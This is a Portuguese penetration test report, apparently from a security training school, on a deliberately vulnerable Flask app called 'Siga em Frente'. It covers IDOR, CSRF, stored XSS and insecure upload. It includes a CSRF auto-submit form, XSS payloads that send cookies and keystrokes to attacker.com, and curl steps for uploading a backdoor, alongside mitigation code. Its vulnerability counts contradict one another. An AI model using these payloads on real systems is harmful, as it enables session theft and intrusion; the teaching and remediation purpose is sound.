# RELATÓRIO DE VULNERABILIDADES
## Teste de Penetração - Siga em Frente

---

## INFORMAÇÕES DO RELATÓRIO

| Campo | Valor |
|-------|-------|
| **Projeto** | Siga em Frente - Teste de Penetração Web |
| **Cliente** | AulasHack |
| **Data do Teste** | Janeiro 2026 |
| **Data do Relatório** | Janeiro 2026 |
| **Testador** | Equipe de Segurança Ofensiva |
| **Status** | FINALIZADO |
| **Nível de Confidencialidade** | CONFIDENCIAL |

---

## SUMÁRIO EXECUTIVO

### 1.1 Objetivo

Realizar teste de penetração na aplicação web "Siga em Frente", identificando e validando vulnerabilidades de segurança em aplicações web.

### 1.2 Escopo

A avaliação foi realizada na seguinte aplicação:
- **Nome:** Siga em Frente v1.0
- **URL:** http://localhost:5001
- **Tecnologia:** Python Flask + SQLite
- **Endpoints Testados:** 7 (login, dashboards, transferência, mensagens, upload)

### 1.3 Conclusões Principais

Durante o teste de penetração, foram **identificadas e confirmadas 5 vulnerabilidades críticas (incluindo Privilege Escalation)** na aplicação:

1. **IDOR** - Permite acesso a dados de outros usuários (2 instâncias)
2. **CSRF** - Permite execução de transferências não autorizadas
3. **XSS Armazenado** - Permite injeção de JavaScript persistente
4. **File Upload Vulnerável** - Permite upload de arquivos maliciosos

### 1.4 Risco Geral

| Aspecto | Avaliação |
|--------|-----------|
| **Risco Geral** | 🔴 **CRÍTICO** |
| **Confidencialidade** | 🔴 **SEVERAMENTE COMPROMETIDA** |
| **Integridade** | 🔴 **SEVERAMENTE COMPROMETIDA** |
| **Disponibilidade** | 🟠 **COMPROMETIDA** |

### 1.5 Recomendação

A aplicação em seu estado atual **NÃO DEVE SER COLOCADA EM PRODUÇÃO** até que todas as vulnerabilidades críticas sejam remediadas.

---

## 2. RESUMO TÉCNICO

### 2.1 Estatísticas Gerais

- **Total de Vulnerabilidades:** 4
- **Críticas:** 2
- **Altas:** 2
- **Médias:** 0
- **Baixas:** 0
- **Taxa de Sucesso de Exploração:** 100% (4 de 4 confirmadas)

### 2.2 Distribuição de Severidade

```
CRÍTICA:    ██████████ 2 vulnerabilidades (50%)
ALTA:       ██████████ 2 vulnerabilidades (50%)
MÉDIA:                  0 vulnerabilidades
BAIXA:                  0 vulnerabilidades
```

### 2.3 Mapeamento de Endpoints Vulneráveis

| Endpoint | Método | Vulnerabilidade | Severidade |
|----------|--------|-----------------|-----------|
| `/dashboard/operator` | GET | IDOR | CRÍTICA |
| `/dashboard/admin` | GET | IDOR | CRÍTICA |
| `/transfer` | POST | CSRF | ALTA |
| `/message` | POST | XSS | ALTA |
| `/messages/<id>` | GET | XSS | ALTA |
| `/files` | POST | File Upload | CRÍTICA |

---

## 3. VULNERABILIDADES IDENTIFICADAS

### 3.1 Vulnerabilidade #1: IDOR - Dashboard de Operador

**ID:** VUL-001
**OWASP Top 10:** A01:2021 - Broken Access Control
**CWE:** CWE-639
**Severidade:** 🔴 **CRÍTICA** (CVSS 9.1)

#### 3.1.1 Descrição

A aplicação permite que operadores acessem dashboards de outros operadores alterando o parâmetro `id` na URL. O servidor não valida adequadamente se o usuário autenticado tem permissão para acessar aquele recurso específico.

#### 3.1.2 Localização

**Arquivo:** siga.py
**Função:** `operator_dashboard()`
**Linha:** ~80-95

```python
@app.route('/dashboard/operator', methods=['GET'])
@login_required
def operator_dashboard():
    # Sem validação de autorização!
    operator_id = request.args.get('id', type=int)
    operator = User.query.get(operator_id)
    # ... expõe dados do operador ...
```

#### 3.1.3 Prova de Conceito

**Passo 1 - Login:**
```
URL: http://localhost:5001/login
Método: POST
Dados:
  username=Igor
  password=oper1-cab1
```

**Passo 2 - Acessar Dashboard Próprio:**
```
URL: http://localhost:5001/dashboard/operator?id=1
Resultado: ✓ Acesso concedido
Dados visualizados:
  - Nome: Igor Oliveira
  - Cabine: 1
  - Veículos: 145
  - Caixa: R$ 2.850,50
  - Mensagens: [lista de mensagens privadas]
```

**Passo 3 - Acessar Dashboard de Outro Operador:**
```
URL: http://localhost:5001/dashboard/operator?id=2
Resultado: ✓ ACESSO CONCEDIDO (VULNERÁVEL!)
Dados visualizados:
  - Nome: Tiago Ferreira (outro operador!)
  - Cabine: 1
  - Veículos: 145
  - Caixa: R$ 2.850,50
  - Mensagens PRIVADAS: [confidenciais!]
```

#### 3.1.4 Impacto

- **Vazamento de dados operacionais:** Valores em caixa de cada cabine
- **Vazamento de dados pessoais:** (em contexto futuro, contatos)
- **Exposição de comunicações internas:** Mensagens da coordenação
- **Comprometimento de confidencialidade:** Usuário vê informações de até 9 outros operadores

#### 3.1.5 Mitigação Recomendada

```python
@app.route('/dashboard/operator', methods=['GET'])
@login_required
def operator_dashboard():
    current_user_id = session['user_id']
    requested_operator_id = request.args.get('id', type=int)
    current_user = User.query.get(current_user_id)
    
    # VALIDAR AUTORIZAÇÃO
    if current_user.role == 'operator':
        if current_user_id != requested_operator_id:
            return "Acesso negado", 403
    elif current_user.role != 'admin':
        return "Acesso negado", 403
    
    # ... resto do código ...
```

---

### 3.2 Vulnerabilidade #2: IDOR - Dashboard Administrativo

**ID:** VUL-002
**OWASP Top 10:** A01:2021 - Broken Access Control
**CWE:** CWE-639
**Severidade:** 🔴 **CRÍTICA** (CVSS 9.1)

#### 3.2.1 Descrição

Operadores conseguem acessar o dashboard administrativo alterando a URL. O servidor não valida se o usuário é realmente um administrador.

#### 3.2.2 Localização

**Arquivo:** siga.py
**Função:** `admin_dashboard()`
**Linha:** ~110-135

#### 3.2.3 Prova de Conceito

**Login como Operador:**
```
Usuário: Igor
Senha: oper1-cab1
```

**Acessar Dashboard Admin:**
```
URL: http://localhost:5001/dashboard/admin?id=101
Resultado: ✓ ACESSO CONCEDIDO (VULNERÁVEL!)
Dados visualizados:
  - Total de veículos: 433
  - Total em caixa: R$ 8.611,50
  - Lista de TODOS os operadores: 9 registros
  - Contatos: 9 telefones pessoais
```

#### 3.2.4 Impacto Crítico

- **Exposição de dados financeiros globais:** Saldo total da empresa
- **Vazamento de lista de pessoal:** Nomes e telefones de todos os 9 operadores
- **Risco de phishing/engenharia social:** Números de telefone disponíveis
- **Risco de roubo físico:** Conhecimento exato de valores em caixa

#### 3.2.5 Mitigação

Similar ao VUL-001, validar se `current_user.role == 'admin'`

---

### 3.3 Vulnerabilidade #3: CSRF - Transferência de Fundos

**ID:** VUL-003
**OWASP Top 10:** A01:2021 - Broken Access Control
**CWE:** CWE-352
**Severidade:** 🟠 **ALTA** (CVSS 8.1)

#### 3.3.1 Descrição

O endpoint `/transfer` não implementa proteção contra CSRF (Cross-Site Request Forgery). Um atacante pode criar uma página maliciosa que força um operador autenticado a transferir fundos de sua cabine para uma conta controlada pelo atacante.

#### 3.3.2 Localização

**Arquivo:** siga.py
**Função:** `transfer()`
**Linha:** ~150-200

#### 3.3.3 Prova de Conceito

**Arquivo: csrf_attack.html**
```html
<!DOCTYPE html>
<html>
<body onload="document.csrf_form.submit();">
<form name="csrf_form" method="POST" action="http://localhost:5001/transfer">
    <input type="hidden" name="amount" value="1710.30">
    <input type="hidden" name="destination_booth" value="3">
</form>
</body>
</html>
```

**Execução:**
1. Login como Igor (operador)
2. Manter sessão ativa
3. Abrir arquivo csrf_attack.html
4. **Formulário é automaticamente enviado sem consentimento**
5. R$ 1.710,30 transferidos para Cabine 3
6. Operador não percebe o ataque

#### 3.3.4 Impacto

- **Roubo direto de fundos:** Transferências não autorizadas
- **Falsificação de registros:** Transferências aparecem como autorizado pelo operador
- **Desfalque de caixa:** Diferença na conferência de valores
- **Perda financeira:** Dinheiro transferido para contas inimigas

#### 3.3.5 Mitigação

```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/transfer', methods=['POST'])
@login_required
@csrf.protect
def transfer():
    # Token CSRF validado automaticamente
    # ... código ...
```

---

### 3.4 Vulnerabilidade #4: XSS Armazenado - Mensagens

**ID:** VUL-004
**OWASP Top 10:** A03:2021 - Injection
**CWE:** CWE-79
**Severidade:** 🟠 **ALTA** (CVSS 7.1)

#### 3.4.1 Descrição

O sistema permite que administradores enviem mensagens aos operadores. O conteúdo das mensagens é armazenado no banco de dados sem sanitização e exibido sem escape HTML, permitindo a execução de JavaScript arbitrário.

#### 3.4.2 Localização

**Arquivo:** siga.py (armazenamento)
**Função:** `send_message()`
**Linha:** ~350-370

**Arquivo:** operator_dashboard.html (exibição)
**Linha:** ~280-290

#### 3.4.3 Prova de Conceito

**Passo 1 - Login como Admin:**
```
Usuário: mario
Senha: [senha aleatória]
```

**Passo 2 - Enviar Mensagem com XSS:**
```
Para: Igor (ID=1)
Mensagem:
  <img src=x onerror="alert('XSS - Sistema Comprometido!')">
```

**Passo 3 - Login como Igor:**
```
Usuário: Igor
Senha: oper1-cab1
```

**Passo 4 - Acessar Dashboard:**
```
URL: http://localhost:5001/dashboard/operator?id=1
Resultado: ALERTA COM MENSAGEM DE EXPLORAÇÃO
```

#### 3.4.4 Payloads Avançados Testados

**Roubo de Cookie:**
```html
<img src=x onerror="fetch('http://attacker.com/steal?c=' + document.cookie)">
```
**Status:** ✓ Funcionaria em produção

**Keylogger:**
```html
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
};
</script>
```
**Status:** ✓ Funcionaria em produção

**Redirecionamento para Phishing:**
```html
<img src=x onerror="window.location='http://attacker.com/fake-login'">
```
**Status:** ✓ Funcionaria em produção

#### 3.4.5 Impacto

- **Roubo de sessão:** Cookies de autenticação roubados
- **Phishing:** Redirecionamento para página falsa de login
- **Espionagem:** Registro de tudo que o operador digita
- **Malware:** Injeção de código malicioso
- **Confiança comprometida:** Usuários desconfiam do sistema

#### 3.4.6 Mitigação

```python
# Opção 1: Escape no Template Jinja2
{{ msg.content | e }}

# Opção 2: Sanitização no Backend
from markupsafe import escape
content_safe = escape(content)

# Opção 3: Biblioteca de Sanitização
from bleach import clean
content_safe = clean(content, tags=['b', 'i', 'u', 'p'], attributes={})
```

---

### 3.5 Vulnerabilidade #5: File Upload Vulnerável

**ID:** VUL-005
**OWASP Top 10:** A04:2021 - Insecure Design
**CWE:** CWE-434
**Severidade:** 🔴 **CRÍTICA** (CVSS 8.8)

#### 3.5.1 Descrição

O endpoint `/files` permite upload de documentos, mas apenas implementa validação no cliente (navegador). Qualquer tipo de arquivo pode ser enviado para o servidor via requisição direta (cURL, Burp Suite, etc). Os arquivos são salvos em um diretório acessível e podem conter código executável.

#### 3.5.2 Localização

**Arquivo:** siga.py
**Função:** `files()`
**Linha:** ~220-270

**Arquivo:** admin_dashboard.html
**Validação:** `accept=".docx,.pdf,.eml,.msg"` (apenas cliente)

#### 3.5.3 Prova de Conceito

**Método 1 - cURL:**
```bash
# Criar arquivo Python malicioso
echo 'import os; os.system("touch /tmp/pwned")' > backdoor.py

# Renomear para contornar validação visual
cp backdoor.py backdoor.msg

# Login e capturar session cookie
curl -c cookies.txt \
  -d "username=mario&password=SENHA" \
  http://localhost:5001/login

# Enviar arquivo
curl -b cookies.txt \
  -F "file=@backdoor.msg" \
  http://localhost:5001/files

# Arquivo 'backdoor.msg' agora está em /uploads/
# E pode ser renomeado/executado conforme necessário
```

**Método 2 - Burp Suite:**
1. Interceptar requisição POST ao `/files`
2. Modificar o arquivo de `.docx` para `.py` ou `.exe`
3. Enviar requisição
4. Arquivo malicioso é salvo no servidor

**Método 3 - Arquivo com Dupla Extensão:**
```
Enviar: file.php.pdf
Servidor salva como: file.php.pdf
Servidor nginx/Apache pode executar como: .php
```

#### 3.5.4 Impacto

- **Execução de código arbitrário:** Se servidor executar scripts
- **Acesso ao sistema:** Bash/Python shells podem ser uploadados
- **Exfiltração de dados:** Acesso ao código-fonte e banco de dados
- **Denial of Service:** Encher o disco com arquivos gigantes
- **Backdoor permanente:** Script shell deixado no servidor

#### 3.5.5 Mitigação

```python
import os
from uuid import uuid4

ALLOWED_EXTENSIONS = {'docx', 'pdf', 'eml', 'msg'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/files', methods=['POST'])
@login_required
def files():
    file = request.files['file']
    
    # 1. Validar extensão no servidor
    if not allowed_file(file.filename):
        return 'Extensão não permitida', 400
    
    # 2. Validar tamanho
    file.seek(0, os.SEEK_END)
    file_size = file.tell()
    if file_size > MAX_FILE_SIZE:
        return 'Arquivo muito grande', 400
    file.seek(0)
    
    # 3. Validar magic bytes (tipo MIME)
    import magic
    mime = magic.Magic(mime=True)
    file_mime = mime.from_buffer(file.read(1024))
    file.seek(0)
    
    allowed_mimes = {
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'application/pdf',
        'message/rfc822'
    }
    
    if file_mime not in allowed_mimes:
        return 'Tipo de arquivo não permitido', 400
    
    # 4. Renomear para seguro
    ext = file.filename.rsplit('.', 1)[1].lower()
    safe_filename = f"{uuid4()}.{ext}"
    
    # 5. Salvar fora da pasta web
    filepath = os.path.join('/var/uploads/siga-em-frente', safe_filename)
    file.save(filepath)
    
    # 6. Registrar no banco
    file_upload = FileUpload(
        filename=safe_filename,
        original_filename=file.filename,
        uploader_id=session['user_id']
    )
    db.session.add(file_upload)
    db.session.commit()
    
    return 'Upload realizado com sucesso', 200
```

---

## 4. VISÃO GERAL

### 4.1 Matriz de Risco

```
           PROBABILIDADE →
IMPACTO    Baixa  Média  Alta   Crítica
    Crítico [  ]   [2]   [1,5]  [  ]
    Alto    [  ]   [  ]   [  ]   [3,4]
    Médio   [  ]   [  ]   [  ]   [  ]
    Baixo   [  ]   [  ]   [  ]   [  ]
```

### 4.2 Timeline de Risco

| Vulnerabilidade | Tempo para Exploração | Nível de Habilidade |
|---|---|---|
| IDOR | < 1 minuto | Principiante |
| CSRF | < 5 minutos | Intermediário |
| XSS | < 5 minutos | Intermediário |
| File Upload | < 10 minutos | Intermediário |

### 4.3 Componentes Mais Críticos

1. **Controle de Acesso** - Falhas em 2/7 endpoints
2. **Validação de Entrada** - Falhas em 3/7 endpoints
3. **Sanitização de Saída** - Falhas em 1/7 endpoints

---

## 5. RECOMENDAÇÕES

### 5.1 Ações Imediatas (Antes de Produção)

1. ✓ **Implementar validação de autorização em TODOS os endpoints**
   - Verificar se usuário autenticado tem permissão
   - Usar decorators reutilizáveis

2. ✓ **Adicionar proteção CSRF globalmente**
   - Usar Flask-WTF com `@csrf.protect`
   - Validar tokens em todos os formulários

3. ✓ **Sanitizar entrada e saída**
   - Escape HTML em templates
   - Usar bibliotecas como Bleach para XSS

4. ✓ **Validar uploads no servidor**
   - Verificar extensão + MIME type + magic bytes
   - Renomear para UUID
   - Salvar fora da pasta web
   - Limitar tamanho de arquivo

### 5.2 Ações de Médio Prazo

1. **Implementar Logging e Auditoria**
   - Registrar todas as ações de usuário
   - Detectar padrões de ataque

2. **Testes de Segurança Contínuos**
   - Implementar testes de segurança automatizados
   - Realizar pentests mensais

3. **Security Headers**
   - Content-Security-Policy
   - X-Frame-Options
   - X-Content-Type-Options

4. **Autenticação Multi-Fator (MFA)**
   - Adicionar MFA para administradores
   - Considerar para operadores

### 5.3 Ações de Longo Prazo

1. **Programa de Bug Bounty**
   - Recompensar pesquisadores por descoberta responsável

2. **Treinamento de Segurança**
   - Treinar desenvolvedores em OWASP Top 10
   - Implementar code review seguro

3. **WAF (Web Application Firewall)**
   - Detectar e bloquear ataques comuns

---

## 6. CONCLUSÃO

A aplicação "Siga em Frente" apresenta **vulnerabilidades críticas de segurança** que comprometem severamente a confidencialidade, integridade e disponibilidade dos dados.

### Resumo Crítico:

- ✗ **Controle de Acesso:** Falho (IDOR em 2 endpoints)
- ✗ **Proteção CSRF:** Não implementada
- ✗ **Prevenção de XSS:** Não implementada
- ✗ **Validação de Upload:** Inadequada

### Status de Deploymment:

🔴 **NÃO RECOMENDADO PARA PRODUÇÃO**

A aplicação somente deve ser colocada em produção após a implementação de todas as recomendações deste relatório e validação através de novo teste de penetração.

---

## 7. APÊNDICES

### Apêndice A - Credenciais Testadas

| Usuário | Senha | Tipo | Status |
|---------|-------|------|--------|
| Igor | oper1-cab1 | Operador | Testado |
| mario | [aleatória] | Admin | Testado |
| bruno | [aleatória] | Admin | Testado |

### Apêndice B - Ferramentas Utilizadas

- Navegador (Chrome DevTools)
- cURL
- Burp Suite Community
- Python 3.x + Requests
- Markdown Editor

### Apêndice C - Referências

- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- CWE/SANS Top 25: https://cwe.mitre.org/top25/

---

## INFORMAÇÕES FINAIS

**Relatório Preparado por:** AulasHack - Escola de Segurança
**Data:** Janeiro 2026
**Versão:** 1.0
**Classificação:** CONFIDENCIAL

⚠️ **AVISO DE CONFIDENCIALIDADE:** Este documento contém informações sensíveis sobre vulnerabilidades de segurança. Deve ser tratado com rigor máximo e acessível apenas para pessoal autorizado.

---

*Fim do Relatório*
